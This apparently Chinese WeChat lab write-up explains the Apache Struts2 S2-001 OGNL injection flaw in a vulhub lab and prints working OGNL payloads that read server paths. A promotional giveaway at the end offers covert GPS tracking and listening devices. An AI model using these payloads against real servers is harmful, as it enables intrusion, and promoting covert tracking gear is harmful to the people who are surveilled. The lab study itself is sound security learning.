> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OdF0qZ8JzFW_c1EMNyMbTg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)  

**漏洞信息：**

**漏洞信息页面：** 

https://cwiki.apache.org/confluence/display/WW/S2-001

  
**漏洞成因官方概述：**

Remote code exploit on form validation error

  

**漏洞影响：**  
WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXL83bBoGVE9u0L3El1ibJHEbCb7ahmzB24k8e9ticTicpCicaGwIOBfSHSWjytDHOlGPShSaTQpddbEbDQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

**环境搭建：**  
用vulhub靶场进行搭建，非常方便

  
 ![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)   
  

我已经搭建完成，这个图片是已经搭建完成的，使用 docker ps 命令 查看已经搭建好的靶场容器。

  
**原理：**

该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}

  
进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}

  
对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行 

  
**利用过程：**  
进入靶场

  
 ![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)   
这个漏洞的问题在于可以直接输入和直接回显  
将POC粘到一个输入框，点击Submit  
此后会将数据提交到后端，后端检测值是否为空，然后返回，满足漏洞前提  
获取tomcat执行路径：  

  

```
<span class="token operator">%</span><span class="token punctuation">{</span><span class="token string">"tomcatBinDir{"</span><span class="token operator"> </span><span class="token annotation punctuation">@java</span><span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token annotation punctuation">@getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token operator"> </span><span class="token string">"}"</span><span class="token punctuation">}</span>
```

  

 ![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==) 

  

获取Web路径：

  

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```

 ![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)   
**总结：**

最后总结一下 S2-001 的一个触发条件：开启 altSyntax 功能；使用 s 标签处理表单；action 返回错误；OGNL 递归处理

  
值得一提的是 Struts2 官方给出了一个解决办法中提到了：从XWork 2.0.4开始，OGNL解析被更改，因此它不是递归的。因此，在上面的示例中，结果将是预期的％{1 1}。

  
也就是只会获取到 username 的内容，而不会再把 username 里的内容再执行一遍。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "微信公众号文章素材之分割线大全")

  

-----**玄魂工作室元旦活动进行中**------

**一、活动奖品**  

  

参加本次互动，可以得到如下奖品：

  

1. 《Kali Linux大揭秘：深入掌握渗透测试平台》 **10本**

**官方出品，涵盖Kali系统从基础知识到高级技巧全方位知识，考取Kali Linux认证专家资质应读的学习纲要！看雪学院段钢，OWASP陈亮、余弦、Claud Xiao、长亭科技杨坤好评力荐！**

  

2. 《Python安全攻防：渗透测试实战指南》**5本**

在网络安全领域，是否具备编程能力是“脚本小子”和真正黑客的本质区别。本书围绕Python在网络安全渗透测试各个领域中的应用展开，通过大量图解，从实战攻防场景分析代码，帮助初学者快速掌握使用Python进行网络安全编程的方法，深入浅出地讲解如何在渗透测试中使用Python，使Python成为读者手中的神兵利器。

  

  

3. 《CTF特训营:技术详解、解题方法与竞赛技巧》**5本**

国内首本CTF赛事技术解析书籍，老牌CTF战队FlappyPig撰写，从安全技术、解题方法、竞赛技巧3大维度全面展开，Web、Reverse、PWN、Crypto、APK、IoT 6大篇，扎扎实实30章，厚达518页，三度Pwn2Own冠军Flanker、CTF赛事国内推动先驱者诸葛建伟、段海新教授联袂推荐。考虑到广大CTF学子，学生群体会比较多，作者团队强烈要求降低图书定价，象征性只拿1%版税用来公益捐出。

  

  

4. 反监听探测仪 2个

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

5. gps定位器追跟器手机监控设备追踪远程专业跟踪听音小型位置监听 2个

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

6. ”玄说安全“知识星球 5折券  

     订阅号回复 ”xqyh"即可领取  

  

**活动参与办法**

活动参与办法见文章：[给你一双火眼金睛，如何窥探手机内部的秘密？](http://mp.weixin.qq.com/s?__biz=MzA4NDk5NTYwNw==&mid=2651428284&idx=1&sn=15a8fb66ba698fd6d320a1b9f8872473&chksm=84238ec4b35407d2cdf1c458a9c5b0ee6b2ed4f36879ef361db0b9be3089294cc5095fe69365&scene=21#wechat_redirect)

  

有任何问题，本篇文章下留言询问，或者扫描下方二维码加小秘书微信，回复“安全”进活动群都可（活动群有现金红包活动）。谢谢支持！  

**![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)**

**--------------------------**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

欢迎关注玄魂工作室

  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)